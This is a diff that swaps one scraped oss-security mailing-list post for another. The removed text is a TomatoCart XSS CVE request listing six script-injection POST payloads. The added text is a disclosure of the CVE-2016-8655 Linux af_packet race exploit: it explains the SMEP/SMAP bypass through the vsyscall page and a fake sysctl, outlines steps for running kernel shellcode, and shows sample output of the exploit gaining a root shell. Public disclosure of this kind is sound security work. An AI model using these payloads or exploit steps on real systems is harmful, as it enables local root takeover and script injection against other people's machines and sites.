@@ -1,65 +1,85 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/11/24/7
-Message-Id: <60EBD88B-40E8-47F9-B959-F8500C994D59@gmail.com>
-Date: Thu, 24 Nov 2016 15:25:10 +0800
-From: haojun hou <haojunhou@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/12/07/3
+Message-ID: <CAHQ_-nTRLMQ21e3DHESbRcJcK3H3DCZGB9yrkx-TeMRi4f5vVQ@mail.gmail.com>
+Date: Wed, 7 Dec 2016 15:03:29 +0900
+From: Philip Pettersson <philip.pettersson@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE request - TomatoCart 1.1.8.6.1 Multiple Cross-Site Scripting (XSS)
+Subject: Re: CVE-2016-8655 Linux af_packet.c race condition (local root)
 Content-Type: text/plain; charset=utf-8
 
-Hi:
-TomatoCart 1.1.8.6.1 - Multiple Cross-Site Scripting (XSS) 
+Attached is a sample exploit for Ubuntu 16.04 x86_64 and some 14.04
+kernels, but the same method should work for any distro with unprivileged
+user namespace support. I only tested it on 4.4 so there's a high risk
+of kernel panic if you run it on anything but 4.4.
 
-Procuct: TomatoCart
+It defeats SMEP/SMAP by calling set_memory_rw() on the vsyscall page,
+setting up a fake struct ctl_table in that area and finally calling
+register_sysctl_table() to register a world-writable sysctl entry for
+modprobe. Since the instruction pointer is hijacked in interrupt
+context you have to do this even on non-SMEP/SMAP systems, so the
+bypass is more of a by-product.
 
-Vendor: TomatoCart http://www.tomatocart.com
+If you want to execute arbitrary kernel shellcode you can also do:
+1. set_memory_rw() on vsyscall page
+2. (userland) write shellcode to vsyscall page
+3. set_memory_x() on vsyscall page
+4. jump to vsyscall page
 
-Vunlerable Version: 1.1.8.6.1 and probably prior
+(However, that requires winning the race three times instead of two.)
 
-Tested Version: 1.1.8.6.1
+You can also run it with "crash" as the first argument to force a panic.
 
-Author: Haojun Hou in ADLab of Venustech
+=*=*=*=*=*=*=*=*= SAMPLE OUTPUT =*=*=*=*=*=*=*=*=
 
- 
+user@...ntu:~$ uname -a
+Linux ubuntu 4.4.0-51-generic #72-Ubuntu SMP Thu Nov 24 18:29:54 UTC
+2016 x86_64 x86_64 x86_64 GNU/Linux
+user@...ntu:~$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+user@...ntu:~$ gcc chocobo_root.c -o chocobo_root -lpthread
+user@...ntu:~$ ./chocobo_root
+linux AF_PACKET race condition exploit by rebel
+kernel version: 4.4.0-51-generic #72
+proc_dostring = 0xffffffff81088090
+modprobe_path = 0xffffffff81e48f80
+register_sysctl_table = 0xffffffff812879a0
+set_memory_rw = 0xffffffff8106f320
+exploit starting
+making vsyscall page writable..
 
-Advisory Details:
-
-Haojun Hou in ADLab of Venustech discovered Multiple Cross-Site Scripting (XSS) in TomatoCart 1.1.8.6.1, which can be exploited to add,modify or delete information in application`s database and gain complete control over the application.
-
- 
-
-The vulnerability exists due to insufficientfiltration of user-supplied data in multiple HTTP POST parameters passed to “TomatoCart-v1-released-v1.1.8.6.1/install/templates/pages/step_5.php” url. An attacker could execute arbitrary HTML and script code in browser in context of the vulnerable website.
-
-The exploitation examples below uses the "alert()" JavaScript function to see a  pop-up messagebox:
-
-(1)POST
-
-DB_DATABASE=  <>"?>";</script><script>alert(1);</script><script>"<?php"
-
-(2)POST
-
-DB_SERVER_PASSWORD= "?>";</script><script>alert(1);</script><script>"<?php"
-
-(3)POST
-
-DB_TABLE_PREFIX= "?>";</script><script>alert(1);</script><script>"<?php"
-
-(4)POST
-
-DB_DATABASE_CLASS= "?>";</script><script>alert(1);</script><script>"<?php"
-
-(5)POST
-
-DB_SERVER_USERNAME= "?>";</script><script>alert(1);</script><script>"<?php"
-
-(6)POST
-
-DB_SERVER= "?>";</script><script>alert(1);</script><script>"<?php"
-
- 
-
-Could you please help me assign a CVE for this issue?
+new exploit attempt starting, jumping to 0xffffffff8106f320,
+arg=0xffffffffff600000
+sockets allocated
+removing barrier and spraying..
+version switcher stopping, x = -1 (y = 174222, last val = 2)
+current packet version = 0
+pbd->hdr.bh1.offset_to_first_pkt = 48
+*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*
+please wait up to a few minutes for timer to be executed. if you
+ctrl-c now the kernel will hang. so don't do that.
+closing socket and verifying.......
+vsyscall page altered!
 
 
+stage 1 completed
+registering new sysctl..
 
- 
+new exploit attempt starting, jumping to 0xffffffff812879a0,
+arg=0xffffffffff600850
+sockets allocated
+removing barrier and spraying..
+version switcher stopping, x = -1 (y = 133577, last val = 2)
+current packet version = 0
+pbd->hdr.bh1.offset_to_first_pkt = 48
+*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*
+please wait up to a few minutes for timer to be executed. if you
+ctrl-c now the kernel will hang. so don't do that.
+closing socket and verifying.......
+sysctl added!
+
+stage 2 completed
+binary executed by kernel, launching rootshell
+root@...ntu:~# id
+uid=0(root) gid=0(root) groups=0(root),1000(user)
+
+View attachment "chocobo_root.c" of type "text/x-csrc" (20105 bytes)
